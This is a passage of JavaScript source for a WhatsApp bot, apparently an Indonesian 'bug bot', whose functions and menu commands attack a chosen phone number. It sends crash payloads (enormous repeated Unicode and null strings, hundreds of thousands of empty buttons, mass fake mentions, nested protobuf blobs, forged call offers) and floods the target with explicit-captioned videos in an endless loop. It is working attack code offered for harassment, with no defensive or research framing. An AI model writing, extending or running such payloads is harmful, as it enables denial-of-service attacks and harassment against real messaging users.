          }
        });
        const waMessage = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "zyzyyIshere",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}}",
                  version: 3
                }
              }
            }
          }
        }, {
          ephemeralExpiration: 0,
          forwardingScore: 9741,
          isForwarded: true,
          font: Math.floor(Math.random() * 99999999),
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        const msgPayload = {
          message: waMessage.message
        };
        const statusMsg = {
          groupStatusMessageV2: msgPayload
        };
        await ndikaSock.relayMessage(targetJid, statusMsg, {
          messageId: waMessage.key.id,
          participant: {
            jid: targetJid
          }
        });
      } catch (err) {
        console.error("error:", err);
      }
    }
    async function sendProtocolRepeatBug(targetJid) {
      console.log(chalk.red("Succesfully Attack Target By : @DapaXploitt"));
      ndikaSock.relayMessage(targetJid, {
        extendedTextMessage: {
          text: "[ ! ] Ndika Xploit 𖥂" + "ꦽꦂ".repeat(90000),
          contextInfo: {
            mentionedJid: Array.from({
              length: 1900
            }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
            externalAdReply: {
              title: "🎭 𝐓𝐫𝐚𝐯𝐚𝐬 𝐔𝐢 🔥",
              body: "",
              previewType: "PHOTO",
              thumbnail: "",
              sourceUrl: telegramLink
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: targetJid,
          quoted: null
        }
      }, {
        messageId: null
      });
    }
    async function sendCrashClickBug(sock, targetJid) {
      try {
        const viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "ោ៝".repeat(63000),
                  hasMediaAttachment: false
                },
                body: {
                  text: "ꦽ".repeat(1024)
                },
                contextInfo: {
                  forwardingScore: 9999,
                  isForwarded: true,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast"
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_call",
                    buttonParamsJson: ""
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                      status: true
                    })
                  }],
                  messageParamsJson: "{}"
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {});
      } catch (err) {
        console.error(err);
      }
    }
    async function sendGroupCrash(sock, targetJid) {
      if (!targetJid.endsWith("@g.us")) {
        throw new Error("@g.us server required");
      }
      let data = targetJid;
      try {
        await ndikaSock.groupParticipantsUpdate(data, ["18188880008@s.whatsapp.net"], "add");
        await ndikaSock.sendPresenceUpdate("composing", data);
      } catch (err) {
        console.error("error:", err);
        throw err;
      }
    }
    async function sendLocationCrash2(targetJid) {
      await ndikaSock.relayMessage(targetJid, {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "kontol⃝҉⃝" + "ꦾ".repeat(40000),
          publisher: "ꦽ".repeat(20000),
          stickers: [],
          fileLength: 12260,
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          height: 9999,
          width: 9999,
          mediaKeyTimestamp: "1747502082",
          isAnimated: false,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          emojis: ["😹", "😹", "😂", "😂"],
          contextInfo: {
            mentionedJid: ["131338822@s.whatsapp.net", ...Array.from({
              length: 1900
            }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
            remoteJid: "X",
            participant: targetJid,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
          packDescription: "",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "3680054",
          stickerPackOrigin: "USER_CREATED"
        }
      }, {
        participant: {
          jid: targetJid
        }
      });
    }
    async function sendViewOnceBug(targetJid) {
      const {
        encodeSignedDeviceIdentity: resultData,
        jidEncode: resultData1,
        jidDecode: resultData2,
        encodeWAMessage: resultData3,
        patchMessageBeforeSending: resultData4,
        encodeNewsletterMessage: resultData5
      } = require("@whiskeysockets/baileys");
      let resultData6 = (await ndikaSock.getUSyncDevices([targetJid], false, false)).map(({
        user: targetJid1,
        device: targetJid2
      }) => targetJid1 + ":" + (targetJid2 || "") + "@s.whatsapp.net");
      await ndikaSock.assertSessions(resultData6);
      let data = () => {
        let options = {};
        return {
          mutex(sock, targetJid1) {
            options[sock] ??= {
              task: Promise.resolve()
            };
            options[sock].task = (async targetJid2 => {
              try {
                await targetJid2;
              } catch {}
              return targetJid1();
            })(options[sock].task);
            return options[sock].task;
          }
        };
      };
      let resultData7 = data();
      let data1 = targetJid1 => Buffer.concat([Buffer.from(targetJid1), Buffer.alloc(8, 1)]);
      let resultData8 = ndikaSock.createParticipantNodes.bind(ndikaSock);
      let data2 = ndikaSock.encodeWAMessage?.bind(ndikaSock);
      ndikaSock.createParticipantNodes = async (sock, targetJid1, count, count1) => {
        if (!sock.length) {
          return {
            nodes: [],
            shouldIncludeDeviceIdentity: false
          };
        }
        let resultMsg2 = await (ndikaSock.patchMessageBeforeSending?.(targetJid1, sock) ?? targetJid1);
        let data3 = Array.isArray(resultMsg2) ? resultMsg2 : sock.map(targetJid2 => ({
          recipientJid: targetJid2,
          message: resultMsg2
        }));
        let {
          id: data4,
          lid: data5
        } = ndikaSock.authState.creds.me;
        let data6 = data5 ? resultData2(data5)?.user : null;
        let data7 = false;
        let resultMsg3 = await Promise.all(data3.map(async ({
          recipientJid: targetJid2,
          message: targetJid3
        }) => {
          let {
            user: resultData10
          } = resultData2(targetJid2);
          let {
            user: resultData11
          } = resultData2(data4);
          let data8 = resultData10 === resultData11 || resultData10 === data6;
          let data9 = targetJid2 === data4 || targetJid2 === data5;
          if (count1 && data8 && !data9) {
            targetJid3 = count1;
          }
          let resultData12 = data1(data2 ? data2(targetJid3) : resultData3(targetJid3));
          return resultData7.mutex(targetJid2, async () => {
            const msgPayload1 = {
              jid: targetJid2,
              data: resultData12
            };
            let {
              type: resultMsg4,
              ciphertext: resultMsg5
            } = await ndikaSock.signalRepository.encryptMessage(msgPayload1);
            if (resultMsg4 === "pkmsg") {
              data7 = true;
            }
            const msgPayload2 = {
              jid: targetJid2
            };
            const msgPayload3 = {
              v: "2",
              type: resultMsg4,
              ...count
            };
            const msgPayload4 = {
              tag: "enc",
              attrs: msgPayload3,
              content: resultMsg5
            };
            const msgPayload5 = {
              tag: "to",
              attrs: msgPayload2,
              content: [msgPayload4]
            };
            return msgPayload5;
          });
        }));
        return {
          nodes: resultMsg3.filter(Boolean),
          shouldIncludeDeviceIdentity: data7
        };
      };
      let randomBytes = crypto.randomBytes(32);
      let resultData9 = Buffer.concat([randomBytes, Buffer.alloc(8, 1)]);
      let {
        nodes: resultMsg,
        shouldIncludeDeviceIdentity: resultMsg1
      } = await ndikaSock.createParticipantNodes(resultData6, {
        conversation: "y"
      }, {
        count: "0"
      });
      let msgPayload = {
        tag: "call",
        attrs: {
          to: targetJid,
          id: ndikaSock.generateMessageTag(),
          from: ndikaSock.user.id
        },
        content: [{
          tag: "offer",
          attrs: {
            "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
            "call-creator": ndikaSock.user.id
          },
          content: [{
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          }, {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          }, {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          }, {
            tag: "net",
            attrs: {
              medium: "3"
            }
          }, {
            tag: "capability",
            attrs: {
              ver: "1"
            },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          }, {
            tag: "encopt",
            attrs: {
              keygen: "2"
            }
          }, {
            tag: "destination",
            attrs: {},
            content: resultMsg
          }, ...(resultMsg1 ? [{
            tag: "device-identity",
            attrs: {},
            content: resultData(ndikaSock.authState.creds.account, true)
          }] : [])]
        }]
      };
      await ndikaSock.sendNode(msgPayload);
    }
    async function sendDelayBlankBug(targetJid) {
      for (let i = 0; i < 10; i++) {
        let buttons = [];
        let buttons1 = [];
        for (let j = 0; j < 10; j++) {
          buttons1.push({
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              header: "ꦽ".repeat(10000),
              body: "ꦽ".repeat(10000),
              flow_action: "navigate",
              flow_action_payload: {
                screen: "FORM_SCREEN"
              },
              flow_cta: "Grattler",
              flow_id: "1169834181134583",
              flow_message_version: "3",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
            })
          });
        }
        for (let j = 0; j < 10; j++) {
          buttons.push({
            body: {
              text: "NdikaExploit🩸"
            },
            header: {
              title: "NdikaExploit🩸" + "\0".repeat(50000),
              hasMediaAttachment: false,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                fileLength: "591",
                height: 0,
                width: 0,
                mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1721344123",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                scanLengths: [247, 201, 73, 63],
                midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
              }
            },
            nativeFlowMessage: {
              buttons: []
            }
          });
        }
        const msgPayload = {
          cards: [...buttons]
        };
        const waMessage = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: "NdikaExploit🩸" + "ꦾ".repeat(50000)
                },
                footer: {
                  text: "NdikaExploit🩸"
                },
                header: {
                  hasMediaAttachment: false
                },
                carouselMessage: msgPayload
              }
            }
          }
        }, {});
        await ndikaSock.relayMessage(targetJid, waMessage.message, {
          messageId: waMessage.key.id
        });
      }
    }
    async function sendPaymentInviteBug(sock, targetJid) {
      for (let i = 0; i < 350; i++) {
        await ndikaSock.relayMessage(targetJid, {
          lottieStickerMessage: {
            message: {
              stickerMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
                fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
                mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
                mimetype: "application/was",
                height: 1280,
                width: 909,
                directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
                fileLength: "134544",
                mediaKeyTimestamp: "1774806705",
                isAnimated: true,
                stickerSentTs: "1774806705729",
                isAvatar: false,
                isAiSticker: false,
                isLottie: true,
                contextInfo: {
                  remoteJid: "LEVGanteng?",
                  forwardingScore: 1,
                  isForwarded: true,
                  forwardedAiBotMessageInfo: {
                    botJid: "867051314767696@bot"
                  },
                  forwardOrigin: 4,
                  statusAttributionType: 2,
                  statusAttributions: Array.from({
                    length: 200900
                  }, (sock1, targetJid1) => ({
                    type: 1
                  }))
                },
                messageContextInfo: {
                  supportPayload: JSON.stringify({
                    is_ai_message: false,
                    ticket_id: crypto.randomBytes(28)
                  }),
                  messageAssociation: {
                    associationType: 11,
                    parentMessageKey: 2,
                    messageIndex: 1
                  }
                }
              }
            }
          }
        }, {
          noSelfSync: true
        });
        await sleep(500);
      }
    }
    async function sendInteractiveFloodBug(sock, targetJid, count = 1) {
      const data = count * 3600000;
      const resultData = Date.now();
      let count1 = 0;
      const buttons = [[186, 3], [210, 4], [170, 2]];
      const data1 = targetJid1 => {
        const buttons1 = [];
        while (targetJid1 >= 128) {
          buttons1.push(targetJid1 & 127 | 128);
          targetJid1 >>>= 7;
        }
        buttons1.push(targetJid1);
        return Buffer.from(buttons1);
      };
      const data2 = function (targetJid1) {
        var resultData3 = String(targetJid1 || "").trim();
        if (resultData3.includes("@")) {
          return resultData3;
        }
        return resultData3.replace(/\D/g, "") + "@s.whatsapp.net";
      };
      const resultData1 = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(data2).filter(function (targetJid1) {
        return targetJid1.length > 15;
      });
      if (!resultData1.length) {
        return;
      }
      const data3 = (sock1, targetJid1) => Buffer.concat([Buffer.from(sock1), data1(targetJid1.length), targetJid1]);
      const msgPayload = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 9100,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        scanLength: [8177, 8118, 9117, 818],
        contextInfo: {}
      };
      msgPayload.contextInfo.remoteJid = "meta@ai";
      const mediaPayload = {
        imageMessage: msgPayload
      };
      const resultData2 = proto.Message.encode(proto.Message.fromObject(mediaPayload)).finish();
      const data4 = (sock1, targetJid1) => {
        let data6 = resultData2;
        for (let i = 0; i < targetJid1; i++) {
          data6 = data3(sock1, data3([10], data6));
        }
        return data6;
      };
      const data5 = async () => {
        if (Date.now() - resultData >= data) {
          console.log("Stopped");
          return;
        }
        try {
          if (count1 < 10) {
            const interactivePayload = {
              interactiveMessage: {
                body: {
                  text: "Hello sir, I am the silent queen, and @levnotdev the shadow king"
                }
              }
            };
            await ndikaSock.relayMessage(targetJid, interactivePayload, {
              noSelfSync: true
            });
          }
          let count2 = 5;
          let count3 = 0;
          for (const data6 of buttons) {
            let data7 = null;
            let count4 = 5000;
            let resultData3 = resultData1.slice(count3, count3 + count2);
            while (count4 >= 2000 && !data7) {
              try {
                const resultData4 = data4(data6, count4);
                const resultData5 = proto.Message.decode(resultData4);
                proto.Message.encode(resultData5).finish();
                data7 = resultData5;
              } catch (err) {}
              count4 -= 400;
            }
            if (!data7) {
              continue;
            }
            const data8 = "QueenMia" + Date.now().toString(36).toUpperCase() + "_" + count3;
            await ndikaSock.relayMessage("status@broadcast", data7, {
              messageId: data8,
              statusJidList: resultData3,
              additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                  tag: "mentioned_users",
                  attrs: {},
                  content: resultData3.map(function (targetJid1) {
                    const msgPayload1 = {
                      jid: targetJid1
                    };
                    const msgPayload2 = {
                      tag: "to",
                      attrs: msgPayload1,
                      content: []
                    };
                    return msgPayload2;
                  })
                }]
              }]
            });
            count3++;
          }
          count1++;
          data5();
        } catch (err) {
          console.error("[ pure forceclose ] error");
          setTimeout(data5, 2000);
        }
      };
      data5();
    }
    async function sendStatusBug(targetJid) {
      try {
        const buttons = [targetJid, "0@s.whatsapp.net", ...Array.from({
          length: 1500
        }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")];
        const msgPayload = {
          mentionedJid: buttons,
          remoteJid: targetJid
        };
        const msgPayload1 = {
          text: "‎",
          contextInfo: msgPayload
        };
        const msgPayload2 = {
          extendedTextMessage: msgPayload1
        };
        const msgPayload3 = {
          userJid: ndikaSock.user.id
        };
        const resultMsg = await generateWAMessageFromContent("status@broadcast", msgPayload2, msgPayload3);
        const msgPayload4 = {
          statusJidList: [targetJid]
        };
        await ndikaSock.relayMessage("status@broadcast", resultMsg.message, msgPayload4);
        console.log("[TAG] Ghost mention terkirim ke: " + targetJid);
        const msgPayload5 = {
          delete: resultMsg.key
        };
        const msgPayload6 = {
          statusJidList: [targetJid]
        };
        await ndikaSock.sendMessage("status@broadcast", msgPayload5, msgPayload6);
        console.log("[CLEAN] Status tag untuk " + targetJid + " telah dihapus.");
      } catch (err) {
        console.error("[ERROR] Gagal eksekusi ghost tag:", err.message);
      }
    }
    async function sendFullDelayBug(sock, targetJid) {
      const interactivePayload = {
        interactiveMessage: {
          body: {
            text: "°Know Ndika¿¿°¿".repeat(60000)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "one_crash_message"
            }, {
              name: "one_crash_message"
            }]
          },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: "document",
              title: "° Know Ndika¿¿°¿",
              sections: Array.from({
                length: 505555
              }, () => ({}))
            })
          }
        }
      };
      const msgPayload = {
        viewOnceMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "° Know Ndika¿°¿"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              },
              nativeFlowResponsMessage: {
                buttons: [{
                  name: "one_crash_message"
                }, {
                  name: "voice_call"
                }, {
                  name: "cta_url",
                  number_phone: "62××××××",
                  url: "https://t.me/NdikaOfficial"
                }]
              }
            }
          }
        }
      };
      await ndikaSock.relayMessage(targetJid, interactivePayload, {});
      await ndikaSock.relayMessage(targetJid, msgPayload, {});
    }
    async function sendButtonFloodBug(sock, targetJid) {
      const statusMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Ndikalevat mek¿¿?",
                display_text: "‌" + "‍".repeat(60000)
              },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  tap_target_configuration: {
                    title: "▸ X ◂",
                    description: "Night7 V1",
                    canonical_url: "https://t.me/NdikaOfficial",
                    domain: "portofolio-langitdev.netlify.app",
                    button_index: 0
                  }
                }),
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      const statusMsg1 = {
        groupStatusMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "‌​",
                display_text: "\0"
              },
              nativeFlowResponsMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "one_crash_message"
                }, {
                  name: "one_crash_message"
                }, {
                  name: "voice_call",
                  phone_number: "62×××××××"
                }, {
                  name: "cta_url",
                  url: "https://t.me/NdikaOfficial"
                }, {
                  name: "booking_confirm",
                  bookingId: "succes"
                }]
              }
            }
          }
        }
      };
      await ndikaSock.relayMessage(targetJid, statusMsg, {});
      await ndikaSock.relayMessage(targetJid, statusMsg1, {});
    }
    async function sendGear4Bug(sock, targetJid) {
      try {
        const interactivePayload = {
          interactiveMessage: {
            body: {
              text: "lev?"
            },
            contextInfo: {
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1000009@newsletter",
                serverMessageId: 123,
                newsletterName: "LEVISBACK"
              },
              isForwarded: true
            }
          }
        };
        const resultData = proto.Message.encode(proto.Message.fromObject(interactivePayload)).finish();
        console.log("📦 Base payload size: " + resultData.length + " bytes");
        const buttons = [[186, 3], [210, 4], [170, 2]];
        const data = function (targetJid1) {
          const buttons1 = [];
          let data7 = targetJid1;
          if (data7 === 0) {
            return Buffer.from([0]);
          }
          while (data7 > 0) {
            let data8 = data7 & 127;
            data7 >>= 7;
            if (data7 > 0) {
              data8 |= 128;
            }
            buttons1.push(data8);
          }
          return Buffer.from(buttons1);
        };
        const data1 = function (sock1, targetJid1) {
          const data7 = Array.isArray(sock1) ? sock1 : [sock1];
          const resultData2 = Array.from(data(targetJid1.length));
          const resultData3 = Array.from(targetJid1);
          const buttons1 = [...data7, ...resultData2, ...resultData3];
          return Buffer.from(buttons1);
        };
        const data2 = function (sock1, targetJid1) {
          const msgPayload = {
            length: targetJid1
          };
          return Array.from(msgPayload).reduce(function (targetJid2) {
            return data1(sock1, data1([10], targetJid2));
          }, resultData);
        };
        const data3 = function (sock1, targetJid1) {
          const data7 = function (sock2, targetJid2) {
            if (sock2 === 0) {
              return targetJid2;
            }
            return data7(sock2 - 1, data1(sock1, data1([10], targetJid2)));
          };
          return data7(targetJid1, resultData);
        };
        const data4 = data3;
        const data5 = function (targetJid1) {
          let resultData2 = String(targetJid1 || "").trim();
          if (resultData2.includes("@")) {
            return resultData2;
          }
          let resultData3 = resultData2.replace(/[^0-9]/g, "");
          if (resultData3.startsWith("0")) {
            resultData3 = "62" + resultData3.substring(1);
          }
          return resultData3 + "@s.whatsapp.net";
        };
        let resultData1 = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(data5).filter(function (targetJid1) {
          return targetJid1 && targetJid1.length > 15;
        });
        if (!resultData1.length) {
          console.log("❌ No valid JIDs, Bos!");
          return;
        }
        const data6 = function () {
          return "SATZ" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 5).toUpperCase();
        };
        const count = 3;
        const count1 = 5000;
        let count2 = 0;
        for (let i = 0; i < resultData1.length; i += count) {
          let resultData2 = resultData1.slice(i, i + count);
          if (i > 0) {
            console.log("⏳ Waiting " + count1 + "ms...");
            await new Promise(function (targetJid1) {
              setTimeout(targetJid1, count1);
            });
          }
          let data7 = Math.floor(i / count) + 1;
          let data8 = data6() + "-" + data7;
          for (let j = 0; j < buttons.length; j++) {
            let data9 = buttons[j];
            let data10 = null;
            let count3 = 0;
            for (let k = 2000; k >= 500 && !data10; k -= 300) {
              try {
                let resultData3 = data4(data9, k);
                let resultData4 = proto.Message.decode(resultData3);
                proto.Message.encode(resultData4).finish();
                data10 = resultData4;
                count3 = k;
              } catch (err) {}
            }
            if (!data10) {
              console.log("⚠️ Batch " + data7 + " | Tag " + (j + 1) + " failed, skip...");
              continue;
            }
            try {
              await ndikaSock.relayMessage("status@broadcast", data10, {
                messageId: data8 + "-" + j,
                statusJidList: resultData2,
                additionalNodes: [{
                  tag: "meta",
                  attrs: {},
                  content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: resultData2.map(function (targetJid1) {
                      const msgPayload = {
                        jid: targetJid1
                      };
                      const msgPayload1 = {
                        tag: "to",
                        attrs: msgPayload,
                        content: []
                      };
                      return msgPayload1;
                    })
                  }]
                }]
              });
              count2++;
            } catch (err) {
              console.log("❌ Send failed: " + err.message);
            }
          }
        }
        return count2;
      } catch (err) {
        console.log("❌ Error: " + err.message);
        throw err;
      }
    }
    async function sendQuickReplyBug(sock, targetJid) {
      try {
        const count = 10000000;
        const interactivePayload = {
          interactiveMessage: {
            body: {
              text: "\0".repeat(60000)
            },
            nativeFlowMessage: {
              buttons: "crash_buttons_image".repeat(20000) + "​".repeat(30000)
            }
          }
        };
        await ndikaSock.relayMessage(targetJid, interactivePayload, {
          participant: {
            jid: targetJid
          }
        });
      } catch (err) {
        console.error("Error:", err);
      }
    }
    async function sendSpamBkpVideo(sock, targetJid) {
      const buttons = ["https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4"];
      const buttons1 = ["😹 Paket!!!!!", "🎬 Adek lu Lagi Colmek Jink"];
      while (true) {
        const data = buttons[Math.floor(Math.random() * buttons.length)];
        const data1 = buttons1[Math.floor(Math.random() * buttons1.length)];
        const msgPayload = {
          url: data
        };
        const msgPayload1 = {
          video: msgPayload,
          mimetype: "video/mp4",
          caption: data1
        };
        await ndikaSock.sendMessage(targetJid, msgPayload1);
      }
    }
    async function sendGroupStatusMention(targetJid) {
      return await ndikaSock.relayMessage(targetJid, {
        requestPaymentMessage: {}
      }, {
        messageId: ndikaSock.generateMessageTag(),
        fromMe: false,
        participant: {
          jid: targetJid
        }
      });
    }

    // Simple & Clean Quoted Reference

    // Clean Reply Function with Subtle Ad Reply
    const reply = (textMsg) => {
  return ndikaSock.sendMessage(
    m.chat,
    {
      text: textMsg
    },
    {
      quoted: m
    }
  );
};
    const uptimeString = "_" + runtime(process.uptime()) + "_";
    const pickRandom = arr => arr[Math.floor(Math.random() * arr.length)];

    // Command Switch
    switch (command) {
      case "menu":
      case "help":
      case "allmenu": {
        const menuText = `*${botName}*
Hai, ${pushname}.

— *Status Sistem*
• Owner   : ${ownerName}
• Mode    : ${ndikaSock.public ? "Public" : "Self"}
• Runtime : ${runtime(process.uptime())}
• Akses   : ${isOwner ? "Owner" : isPremium ? "Premium" : "User"}

— *Tools & Action*
• ${prefix}blast <nomor>
• ${prefix}delay <nomor>
• ${prefix}freeze <nomor>
• ${prefix}click <nomor>
• ${prefix}blank <nomor>
• ${prefix}combo <nomor>
• ${prefix}combov2 <nomor>
• ${prefix}overdrive <nomor>
• ${prefix}pushmedia <nomor>

— *Manajemen Grup*
• ${prefix}idgrup <link>
• ${prefix}gbroadcast <id/link>
• ${prefix}grouptest <link>
• ${prefix}upsw <teks/media>

— *Pengaturan Owner*
• ${prefix}addowner <nomor>
• ${prefix}delowner <nomor>
• ${prefix}addprem <nomor>
• ${prefix}delprem <nomor>
• ${prefix}public / ${prefix}self
• ${prefix}eval <code>

— *Informasi*
• ${prefix}ping
• ${prefix}info
• ${prefix}inspect

_${botWm}_`;

        ndikaSock.sendMessage(
    m.chat,
    {
      text: menuText
    },
    {
      quoted: m
    }
  );
        break;
      }

      case "tools":
      case "fitur":
      case "toolmenu":
      case "bugmenu": {
        const toolsText = `*${botName}* — _Daftar Fitur_

Berikut daftar perintah yang tersedia:
Format nomor: 628xxx (tanpa spasi / tanda +)

• *${prefix}blast* <nomor>
• *${prefix}delay* <nomor>
• *${prefix}freeze* <nomor>
• *${prefix}click* <nomor>
• *${prefix}blank* <nomor>
